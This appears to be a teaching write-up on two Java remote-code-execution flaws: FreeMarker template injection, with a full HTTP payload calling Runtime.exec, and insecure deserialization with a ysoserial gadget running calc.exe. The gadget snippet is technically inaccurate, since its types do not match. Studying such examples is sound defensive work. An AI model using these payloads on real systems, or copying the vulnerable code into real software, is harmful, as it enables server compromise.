lesson.example:
**Vulnerable snippet (target.example)**
```java
// Java controller handling template upload
@PostMapping("/api/report/template")
public ResponseEntity<String> uploadTemplate(@RequestBody String userTemplate) {
    // The user‑provided template is concatenated directly into a FreeMarker template
    String ftl = "<html><body>${userTemplate}</body></html>"; // ❌ unescaped insertion
    Template template = new Template("report", ftl, cfg);
    StringWriter out = new StringWriter();
    template.process(null, out); // renders the template
    return ResponseEntity.ok(out.toString());
}
```
**Attack request**
```
POST /api/report/template HTTP/1.1
Host: target.example
Content-Type: application/json

{"userTemplate":"${"".class.forName('java.lang.Runtime').getRuntime().exec('id').getInputStream().readAllBytes()}"}
```
**Why it works**: The server builds a FreeMarker template that contains `${...}`. FreeMarker evaluates the expression, which uses Java reflection (`class.forName`) to obtain `java.lang.Runtime` and runs the `id` command. Because the template engine’s sandbox is not enforced, the malicious expression runs with the server’s privileges, returning the command output.

**Fictional vulnerable service (target.example:9090)**
```java
// vulnerable Java daemon listening on TCP
ServerSocket ss = new ServerSocket(9090);
while (true) {
    Socket s = ss.accept();
    ObjectInputStream ois = new ObjectInputStream(s.getInputStream());
    // No signature check, no class whitelist
    Object obj = ois.readObject(); // deserialization occurs here
    // ... further processing ...
}
```
**Attack payload** (Commons Collections gadget that runs `calc.exe` on Windows):
```java
// generated with ysoserial
byte[] payload = org.apache.commons.collections.functors.InvokerTransformer
    .getInstance("exec", new Class[]{String.class}, new Object[]{"calc.exe"});
```
**What the attacker sends** (raw bytes over TCP):
```
[serialized object bytes]
```
**Why it works**: The daemon reads the raw bytes and calls `readObject()`. Because there is no verification, the attacker’s serialized gadget chain is instantiated. The gadget’s `readObject` method triggers `Runtime.getRuntime().exec("calc.exe")`, executing the command on the server. This demonstrates insecure deserialization leading to remote code execution.
